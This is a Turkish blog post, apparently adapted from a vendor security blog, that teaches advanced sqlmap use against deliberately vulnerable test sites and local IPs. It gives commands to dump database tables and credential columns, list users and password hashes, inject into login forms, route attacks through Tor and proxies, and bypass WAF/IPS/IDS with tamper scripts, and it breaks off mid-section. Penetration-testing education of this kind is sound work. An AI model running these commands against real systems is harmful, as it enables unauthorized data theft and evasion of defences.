---
layout: post
title: İleri Seviye Sqlmap Kullanımı
date: 2022-02-12 01:21
author: theguler
comments: true
categories: [Hacking - Security]
---
<!-- wp:image {"id":1718,"width":487,"height":256,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large is-resized"><img src="https://farukguler.com/assets/post_images/hqdefault-2.jpg?w=1024" alt="" class="wp-image-1718" width="487" height="256" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>İlk olarak, bazı basit parametrelerin kullanımına dair örneklerle başlayalım. Bilindiği üzere en yaygın kullanılan sqlmap parametresi URL’i ifade eden&nbsp;<code>-u</code>&nbsp;ya da&nbsp;<code>--url</code>&nbsp;parametresidir. Aşağıdaki kullanımda da görüldüğü üzere sqlmap’e hedef sitenin URL’ini tanıtır:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.netsparker.com.tr/blog/web-guvenligi/ileri-seviye-sqlmap-kullanimi/#"><img src="https://d4qkvw08lssf8.cloudfront.net/statics/img/drive/Ileri-Seviye-Sqlmap-Kullanimi-01.png" alt="sqlmap'te Yaygın Olarak Kullanılan Url Parametresine Örnek" /></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Bu komut sonucunda, eğer taratılmasını istediğimiz URL’de SQL Injection zafiyeti mevcutsa, zafiyetin türü, hangi DBMS (Database Management System)’in kullanıldığı, web uygulama dili ve sunucu versiyonu gibi bazı bilgilere ulaşmamız mümkün olacaktır. Devamında SQL Injection’ın var olduğunu öğrendiğimiz URL vasıtasıyla saldırıya&nbsp;<code>--dbs</code>&nbsp;parametresini ekleyerek mevcut veri tabanlarının listesini ekrana getirebiliriz:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1</td><td><code>sqlmap -u “<a href="http://aspnet.testsparker.com/Products.aspx?pId=4">http://aspnet.testsparker.com/Products.aspx?pId=4</a>” --dbs</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.netsparker.com.tr/blog/web-guvenligi/ileri-seviye-sqlmap-kullanimi/#"><img src="https://d4qkvw08lssf8.cloudfront.net/statics/img/drive/Ileri-Seviye-Sqlmap-Kullanimi-02.png" alt="Veri Tabanı Listesine Ait Çıktılar" /></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Ekran görüntüsünde de görüldüğü üzere mevcut veri tabanlarının listesini elde etmiş olduk. Bundan sonra, sırayla tabloları, kolonları ve kayıtları aşağıdaki parametreleri kullanmamız gerekiyor:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1</td><td><code>sqlmap -u “<a href="http://aspnet.testsparker.com/Products.aspx?pId=4">http://aspnet.testsparker.com/Products.aspx?pId=4</a>” -D testsparker --tables</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1</td><td><code>sqlmap -u “<a href="http://aspnet.testsparker.com/Products.aspx?pId=4">http://aspnet.testsparker.com/Products.aspx?pId=4</a>” -D testsparker -T tablo --columns</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1</td><td><code>sqlmap -u “<a href="http://aspnet.testsparker.com/Products.aspx?pId=4">http://aspnet.testsparker.com/Products.aspx?pId=4</a>” -D testsparker -T tablo -C kullanici,parola --dump</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p><strong>-D:</strong>&nbsp;Bu parametre ile veri tabanı adını belirtmiş olduk.<br><strong>–tables:</strong>&nbsp;Belirttiğimiz veri tabanındaki tablo isimlerini getirmek için bu parametre kullanılır.<br><strong>-T:</strong>&nbsp;Tablo isimleri de alındıktan sonra kolonlarına ulaşılması istenen tablo adı bu parametre ile birlikte yazılır.<br><strong>–columns:</strong>&nbsp;Adı belirtilen tablodaki kolonlar getirilir.<br><strong>-C:</strong>&nbsp;İstenilen kolon adı yazılır.<br><strong>–dump:</strong>&nbsp;Kolonlarda yer alan veriler ekrana yansıtılır.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Tüyo:</strong>&nbsp;Tek tire (-) veya çift tire (–) kullanıldığında parametre ile parametrenin aldığı değer arasında boşluk ya da eşittir işaretinden (=) hangisinin kullanılması gerektiğini karıştırıyorsanız tek tireli parametrelerde boşluğun, çift tireli parametrelerde ise değer girilmeden önce eşittir işaretinin kullanıldığını aklınızda tutabilirsiniz.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Not:</strong>&nbsp;Herhangi bir database’den veri çekebilmek için sqlmap ile test ettiğimiz uygulamanın veri tabanı kullanıcısının gereken yetkileri haiz olması zorunluluğunu unutmamak gerekir.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 id="yetki-kontrolu">Yetki Kontrolü</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Yukarıda da belirttiğimiz üzere bazı komutların sonuç verebilmesi için bağlı olduğumuz veri tabanı kullanıcısının gerekli izinlere sahip olması gerekir. Bunların kontrolünü sağlamada kullanabileceğimiz birkaç parametre mevcut. Veri tabanı kullanıcılarını öğrenebilmek için&nbsp;<code>--users</code>&nbsp;parametresini, kullanıcıların parolaları için&nbsp;<code>--passwords</code>&nbsp;parametresini, kullanıcı yetkileri için&nbsp;<code>--privileges</code>&nbsp;parametresini ve kullanıcı rolleri için ise&nbsp;<code>--roles</code>&nbsp;parametresini kullanabiliriz. Hangi kullanıcının yetki ve/veya rollerini öğrenmek istiyorsak o kullanıcı adını&nbsp;<code>-U</code>&nbsp;parametresiyle birlikte eklememiz gerekmektedir. Eklemediğimiz takdirde “current user” yani veri tabanı bağlantısını gerçekleştiren kullanıcının yetki veya rolleri ekrana yansıyacaktır. Son olarak kullanıcının, veri tabanı yöneticisi (DBA) olup olmadığını&nbsp;<code>--is-dba</code>&nbsp;parametresini kullanabilmekteyiz. Dönüt olarak “True” ya da “False” değerini alırız. Bahsettiğimiz parametrelere dair bir örneği ve örneğe ilişkin ekran görüntüsünü aşağıda görmektesiniz:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1</td><td><code>sqlmap -u <a href="http://php.testsparker.com/artist.php?id=2">http://php.testsparker.com/artist.php?id=2</a> --risk=3 --level=3 --dbms=mysql --is-dba --users --privileges --roles</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.netsparker.com.tr/blog/web-guvenligi/ileri-seviye-sqlmap-kullanimi/#"><img src="https://d4qkvw08lssf8.cloudfront.net/statics/img/drive/Ileri-Seviye-Sqlmap-Kullanimi-09.jpg" alt="Yapılan Örneğin Çıktısına Ait Ekran Görüntüsü" /></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Not:</strong>&nbsp;Ekranda yer kaplamaması için tüm çıktılar gösterilmemiştir.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 id="birden-fazla-hedefi-tarama">Birden Fazla Hedefi Tarama</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Sqlmap’in&nbsp;<code>-m</code>&nbsp;parametresiyle birden fazla URL’in taratılması mümkündür. Örneğin aşağıdaki gibi bir içeriğe sahip&nbsp;<em>linkler.txt</em>&nbsp;dosyasında bulunan URL’ler sqlmap ile taratılabilir:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1234</td><td><code><a href="http://php.testsparker.com/artist.php?id=2">http://php.testsparker.com/artist.php?id=2</a></code><code><a href="http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-62/">http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-62/</a></code><code><a href="http://192.168.1.38/index.php?action=gallery_view&amp;gallery_id=1">http://192.168.1.38/index.php?action=gallery_view&amp;gallery_id=1</a></code><code><a href="http://localhost/index.php?action=test">http://localhost/index.php?action=test</a></code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>Bunun için, parametreden sonra dosyanın path’i belirtilir:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1</td><td><code>sqlmap -m "C:\Users\[USER]\Desktop\linkler.txt"</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:heading {"level":3} -->
<h3 id="bir-istek-dosyasi-yukleme">Bir İstek Dosyası Yükleme</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Bu işlemi gerçekleştirebilmek için -r parametresini kullanmak gerekir. Herhangi bir proxy yazılımıyla araya girerek, yaptığımız isteği kopyalıyor ve bir metin dosyasına kaydediyoruz. Örneğin&nbsp;<em>istek.txt</em>&nbsp;adlı dosyaya ait içeriğin aşağıdaki gibi olduğunu varsayalım:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>12345678910</td><td><code>GET <a href="http://aspnet.testsparker.com/blog/how-does-bitcoin-work-63/">http://aspnet.testsparker.com/blog/how-does-bitcoin-work-63/</a> HTTP/1.1</code><code>Host: aspnet.testsparker.com</code><code>Connection: keep-alive</code><code>Cache-Control: max-age=0</code><code>Upgrade-Insecure-Requests: 1</code><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36</code><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</code><code>Accept-Encoding: gzip, deflate, sdch</code><code>Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.6,en;q=0.4</code><code>Cookie: ASP.NET_SessionId=zpuu4rzda5rxued21mwqttd3; TestCookie=Hello</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>Sqlmap’te kullanım şöyle olacaktır (dosyanın sqlmap dizininde olduğunu farz ediyoruz):</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1</td><td><code>sqlmap -r "istek.txt"</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p><strong>Not:</strong>&nbsp;Burada yapılan istekte Rewrite edilmiş bir URL yapısı kullanılmıştır. Konuyla alakalı ayrıntıları yazının ilerleyen bölümlerinde bulabilirsiniz.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="post-istegi-yapma">POST İsteği Yapma</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Sqlmap kullanımı sırasında düşülen yanılgılardan biri, sqlmap ile sadece GET isteği yapılabildiğinin düşünülmesidir. Halbuki sqlmap, GET isteklerinin yanı sıra POST isteğiyle tarama yapmaya da elverişlidir. Bir login ya da arama formunda bulunan SQL Injection açıklarını bulmak ve bunları exploit edebilmek için&nbsp;<code>--data</code>&nbsp;parametresiyle POST isteği yapmak mümkündür.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Aşağıdaki gibi bir giriş panelinde SQL Injection aradığımızı veya bulduğumuzu düşünelim:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.netsparker.com.tr/blog/web-guvenligi/ileri-seviye-sqlmap-kullanimi/#"><img src="https://d4qkvw08lssf8.cloudfront.net/statics/img/drive/Ileri-Seviye-Sqlmap-Kullanimi-03.png" alt="Örnek Bir Login Sayfası" /></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Sqlmap’te test etmek için POST bilgisine ihtiyacımız var. Bu bilgiyi, herhangi bir proxy yazılımıyla araya girerek elde edebiliriz. Örnek saldırı şöyle olacaktır:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1</td><td><code>sqlmap -u "<a href="http://192.168.1.37/index.php?action=login">http://192.168.1.37/index.php?action=login</a>" --data="loginname=admin&amp;loginpass=admin&amp;duration=mins30" -p "loginname" --dbms="MySQL"</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>Burada, SQL Injection aradığımız formun POST bilgisini, hangi parametrenin test edileceğini (<code>-p</code>) ve DBMS bilgisini (<code>--dbms</code>) girdik. POST bilgilerinin sqlmap’e yazılamayacak durumda olduğu bazı durumlarda aynı işlemi istek dosyası yükleme yöntemiyle yapmak da mümkündür. Örneğin şöyle bir POST istek dosyasıyla yapılan atakta kullanacağımız komut biraz değişecektir:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>12345678910111213141516171819202122232425</td><td><code>POST <a href="http://192.168.1.37/index.php">http://192.168.1.37/index.php</a> HTTP/1.1</code><code>Host: 192.168.1.37</code><code>Connection: keep-alive</code><code>Content-Length: 341</code><code>Cache-Control: max-age=0</code><code>Origin: <a href="http://192.168.1.37/">http://192.168.1.37</a></code><code>Upgrade-Insecure-Requests: 1</code><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36</code><code>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHFlodLUdWprARroi</code><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</code><code>Referer: <a href="http://192.168.1.37/index.php?action=login">http://192.168.1.37/index.php?action=login</a></code><code>Accept-Encoding: gzip, deflate</code><code>Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.6,en;q=0.4</code><code>Cookie: PHPSESSID=0htj53cii9juj28a2gui2qe2c0;</code><code>------WebKitFormBoundaryHFlodLUdWprARroi</code><code>Content-Disposition: form-data; name="name"</code><code>admin</code><code>------WebKitFormBoundaryHFlodLUdWprARroi</code><code>Content-Disposition: form-data; name="password"</code><code>admin</code><code>------WebKitFormBoundaryHFlodLUdWprARroi</code><code>Content-Disposition: form-data; name="duration"</code><code>mins30</code><code>------WebKitFormBoundaryHFlodLUdWprARroi--</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>Kullanacağımız komut:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1</td><td><code>sqlmap -r istek.txt -p "loginname" --dbms="MySQL"</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>Not: Basit parametrelerden biri olan&nbsp;<code>--dbms</code>&nbsp;testlerin daha hızlı bitmesini sağlayabilir. Daha önceden bildiğiniz ya da testler sırasında öğrendiğiniz veri tabanı yönetim sistemlerinden hangisinin kullanıldığı bilgisini parametreye değer olarak verdiğinizde sqlmap, sonraki testlerde sadece söz konusu DBMS’e odaklanacaktır. Diğer DBMS’ler için gereken testleri atlayarak saldırıların süresini kısaltmış olacaktır.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 id="forms-parametresi">Forms Parametresi</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>POST istekleriyle ilintili başka bir parametre ise&nbsp;<code>--forms</code>&nbsp;parametresidir. Bu parametreyi kullanarak URL’deki formların sqlmap tarafından tespit edilmesinin sağlanması mümkündür. Kullanımı şu şekildedir:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1</td><td><code>sqlmap -u <a href="http://192.168.1.37/index.php?action=login">http://192.168.1.37/index.php?action=login</a> --forms</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>Ardından sqlmap, sizden formu test etmek isteyip istemediğinizi soracak ve olumlu cevap verdiğiniz takdirde POST verisini düzenlemenizi isteyecek. Test edilmesini istemediğiniz formlar için olumsuz cevap verdiğinizde bir sonraki form için aynı soruyu soracaktır.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.netsparker.com.tr/blog/web-guvenligi/ileri-seviye-sqlmap-kullanimi/#"><img src="https://d4qkvw08lssf8.cloudfront.net/statics/img/drive/Ileri-Seviye-Sqlmap-Kullanimi-04.png" alt="Form Parametresinin Çıktısına Ait Ekran Görüntüsü" /></a></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="url-rewrite-in-aktif-olma-durumu">URL Rewrite’ın Aktif Olma Durumu</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Sqlmap, URI path’lerine karşı otomatik olarak herhangi bir test gerçekleştirmemesine rağmen bu path’leri manuel olarak işaretleyerek sqlmap’in test edebilmesini sağlamak mümkündür. Bu yöntem özellikle URL Rewrite özelliğinin aktif olduğu durumlarda yarar sağlamaktadır. Bu işlem için sadece parametrenin aldığı değerin sonuna asterisk (*) karakteri eklenmelidir. Şu şekilde örnek verebiliriz:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1</td><td><code>sqlmap -u "<a href="http://example.com/blog/yazi/1">http://example.com/blog/yazi/1</a>*"</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>URL Rewrite’sız hali ise şöyle olurdu:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1</td><td><code>sqlmap -u "<a href="http://example.com/blog.php?yazi=1">http://example.com/blog.php?yazi=1</a>"</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>Yukarıda da olduğu gibi hangi parametrenin işaretlenmesi gerektiğine manuel olarak karar verebilmenizin yanı sıra sqlmap bunu, sizin onayınızı aldıktan sonra otomatik olarak da yapabilmektedir.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="http-authentication">HTTP Authentication</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Sqlmap ile Basic, Digest, NTLM ya da PKI kimlik doğrulaması isteyen uygulamalarda da tarama yapmak mümkün. Bunun için kullanılan parametre&nbsp;<code>--auth-type</code>&nbsp;parametresidir. Gerekli oturum bilgileriniyse&nbsp;<code>--auth-cred</code>&nbsp;parametresiyle tanıtıyoruz. Örnek bir kullanım aşağıdaki gibidir:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1</td><td><code>sqlmap -u <a href="http://exapmle.com/main.php?action=writer&amp;id=1">http://exapmle.com/main.php?action=writer&amp;id=1</a> --auth-type="Basic" --auth-cred="user:password"</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>Credential’larda bir yanlışlık olursa şu hatayı almamız kaçınılmaz olur:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>123</td><td><code>[09:53:40] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401)</code><code>[09:53:40] [WARNING] HTTP error codes detected during run:</code><code>401 (Unauthorized) - 1 times</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:heading -->
<h2 id="proxy-ve-tor-kullanimi">Proxy ve Tor Kullanımı</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Proxy kullanımı için sağlanan parametre&nbsp;<code>--proxy</code>&nbsp;parametresidir. Şayet kullanılacak proxy’e ait credential’lar mevcutsa bunu tanıtmak için&nbsp;<code>--proxy-cred</code>&nbsp;parametresi kullanılır. Ayrıca bir dosyadan proxy listesi dahil etmek için&nbsp;<code>--proxy-file</code>&nbsp;parametresine ihtiyaç duyarız. Proxy’nin protokolü (HTTP/S) mutlaka girilmelidir. Örnek kullanım şöyledir:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1</td><td><code>sqlmap -u "<a href="http://example.com/index.php?id=test">http://example.com/index.php?id=test</a>" --proxy="<a href="http://127.0.0.1:80/">http://127.0.0.1:80:80</a> --proxy-cred="user:pass"</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:heading {"level":3} -->
<h3 id="tor-parametresi">Tor Parametresi</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Tor proxy’sini kullanmak da oldukça basit. Tor bağlantısı ile tarama yapabilmek için öncelikle bilgisayarınızda Tor Browser ya da Tor Bundle’ın yüklü olması gerekir. Sqlmap’te kullanımı&nbsp;<code>--tor</code>&nbsp;parametresi ile sağlanır. Bağlantının gerçekleşmesi için Tor’un çalıştırılmış olması gerekir. Bununla birlikte&nbsp;<code>--tor-proxy</code>&nbsp;ve&nbsp;<code>--tor-type</code>&nbsp;parametrelerinin de tanıtılması gerekebilir. Örnek kullanım şöyledir:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1</td><td><code>sqlmap -u "<a href="http://aspnet.testsparker.com/Products.aspx?pId=4">http://aspnet.testsparker.com/Products.aspx?pId=4</a>" --tor --tor-type="SOCKS5" --tor-port=9050</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>Burada dikkat edilmesi gereken nokta şu ki Tor’un varsayılan port numarası 9050 iken Tor Browser’ın varsayılan port numarası 9150 gelmektedir. Son olarak komutun sonuna ekleyeceğimiz&nbsp;<code>--check-tor</code>&nbsp;parametresi ile Tor bağlantısının durumu öğrenebiliriz. Bağlantı gerçekleştiği takdirde sqlmap çıktısı şöyle olacaktır.</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>12</td><td><code>[10:11:31] [INFO] checking Tor connection</code><code>[10:11:32] [INFO] Tor is properly being used</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:heading -->
<h2 id="level-risk-parametreleri">Level – Risk Parametreleri</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Söz konusu parametreler sqlmap’in hangi testleri yapacağını belirtir. Ön tanımlı olarak&nbsp;<code>--level</code>&nbsp;parametresi 1 olarak gelir ve 1-5 arası değer alabilir.&nbsp;<code>--risk</code>&nbsp;parametresinin varsayılan değeri 1’dir ve 1-3 arası değer alabilir. Örnek case üzerinden gidecek olursak, şu komutu çalıştırdığımızda;</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1</td><td><code>sqlmap -u "<a href="http://php.testsparker.com/artist.php?id=test">http://php.testsparker.com/artist.php?id=test</a>" --dbs</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>Çeşitli denemelerin ardından sqlmap’in şu hatayı verdiğini görürüz:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>12</td><td><code>[10:33:23] [WARNING] GET parameter 'id' does not seem to be injectable</code><code>[10:33:23] [CRITICAL] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp'). If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment')</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>Sqlmap, hedefe uygun testi gerçekleştirmemiş ve bu yüzden hedefte SQL Injection’ın var olduğunu doğrulayamamıştır. Şimdi ise komutumuza SQL sorgu denemelerini çeşitlendiren&nbsp;<code>--risk</code>&nbsp;parametresi ve prefix, suffix, payload çeşitlerini belirleyen&nbsp;<code>--level</code>&nbsp;parametresini uygun değerleriyle ekliyoruz:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>1</td><td><code>sqlmap -u "<a href="http://php.testsparker.com/artist.php?id=test">http://php.testsparker.com/artist.php?id=test</a>" --dbs --risk=3 --level=3</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>Uzun bir bekleyişin ardından “Boolean-based-blind” ve “AND/OR time based blind” türünde SQL Injection açığının bulunduğunu öğrenmiş olduk. Ayrıca veri tabanı isimlerini bulmak için denemelere başladı:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.netsparker.com.tr/blog/web-guvenligi/ileri-seviye-sqlmap-kullanimi/#"><img src="https://d4qkvw08lssf8.cloudfront.net/statics/img/drive/Ileri-Seviye-Sqlmap-Kullanimi-05.png" alt="Risk ve Level Parametrelerinin Kullanımına İlişkin Örnek Görüntüsü" /></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Not: Risk ve level değerlerini artırdığınızda yapılan testlerin sayısı artar. Bu testleri bir nebze olsun hızlandırabilmek için&nbsp;<code>--threads</code>&nbsp;parametresini kullanırız. Bu parametreyle eş zamanlı bağlantı sayısını değiştirmemiz mümkün. Varsayılan değeri 1 iken daha fazla payload’un eş zamanlı olarak test edilmesini sağlamak için 10 değerini verebiliriz. Ek olarak&nbsp;<code>--eta</code>&nbsp;parametresiyle, yapılan işlemler için tahmini bitiş süresi bir progress satırı şeklinde ekrana yansıtılmaktadır. Örneğin:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.netsparker.com.tr/blog/web-guvenligi/ileri-seviye-sqlmap-kullanimi/#"><img src="https://d4qkvw08lssf8.cloudfront.net/statics/img/drive/Ileri-Seviye-Sqlmap-Kullanimi-06.png" alt="Eta Parametresinin Kullanımına Dair Ekran Görüntüsü" /></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Hangi level ve risk değerinde, hangi veri tabanı için hangi testin yapıldığını&nbsp;<em>sqlmap\xml</em>&nbsp;dizininde yer alan&nbsp;<em>payloads</em>&nbsp;klasöründeki XML dosyaları inceleyerek öğrenebilirsiniz. Ayrıca size özel payload’lar tanımlamak için de bu dosyaları düzenleyebilirsiniz.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Risk değerleri ve değerlere göre yapılan testler şöyledir:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>1 – Ön tanımlı olarak gelen değer.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>2 – Time Based ataklar uygular.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>3 – OR Based ataklar uygular.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Level değerleri ve değerlere göre yapılan testler şöyledir:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>1 – Ön tanımlı olarak gelen değer. 100’den az istek gönderir.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>2 – 100 ile 200 arası istek uygular.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>3 – 200 ile 500 arası istek uygular.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>4 – 500 ile 1000 arası istek gönderir.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>5 – 1000’den fazla istek gönderir.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2 id="tamper-parametresi-ve-waf-ips-ids-bypass">Tamper Parametresi ve WAF/IPS/IDS Bypass</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Hedef taratılırken şöyle bir uyarıyla karşılaşıyorsak hedef uygulamayla backend DBMS arasında bir girdi doğrulama mekanizmasının var olduğunu anlayabiliriz:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>12</td><td><code>[11:36:30] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS</code><code>[11:36:30] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>Bunun bir WAF (Web Application Firewall), IPS (Intrusion Prevention System), IDS (Intrusion Detection System) vasıtasıyla ya da uygulamanın kaynak kodunda bulunan bir doğrulamayla sağlanması mümkün. Tam da bu noktada sqlmap aracı,&nbsp;<code>--tamper</code>&nbsp;parametresiyle yardımımıza koşuyor. Bu parametreyi,&nbsp;<em>sqlmap\tamper</em>&nbsp;dizininde bulunan scriptler ya da custom olarak ekleyebileceğiniz scriptler aracılığıyla çalıştırdığınızda hedef uygulamadaki WAF/IPS/IDS’nin bypass edilmesi mümkün hale getirilebilir.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>WAF/IPS bulunan bir hedefi taratırken şöyle bir soruyla karşılaşabiliriz:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>123</td><td><code>[11:44:43] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS</code><code>[11:44:43] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS</code><code>do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N]</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
